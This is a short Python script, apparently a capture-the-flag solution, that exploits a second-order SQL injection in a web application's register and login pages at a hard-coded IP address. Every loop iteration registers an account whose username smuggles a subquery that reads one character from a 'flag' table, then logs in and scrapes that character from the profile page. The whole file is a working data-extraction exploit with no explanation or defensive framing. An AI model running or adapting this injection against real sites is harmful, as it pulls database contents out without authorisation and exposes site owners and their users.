import requests
import re


register_url = 'http://220.249.52.133:55093//register.php'
login_url = 'http://220.249.52.133:55093//login.php'


for i in range(1, 100):
    register_data = {
        'email': '111@123.com%d' % i,
        'username': "0' + ascii(substr((select * from flag) from %d for 1)) + '0" % i,
        'password': 'admin'
    }
    res = requests.post(url=register_url, data=register_data)

    login_data = {
        'email': '111@123.com%d' % i,
        'password': 'admin'
    }
    res_ = requests.post(url=login_url, data=login_data)
    code = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', res_.text)
    print(chr(int(code.group(1))), end='')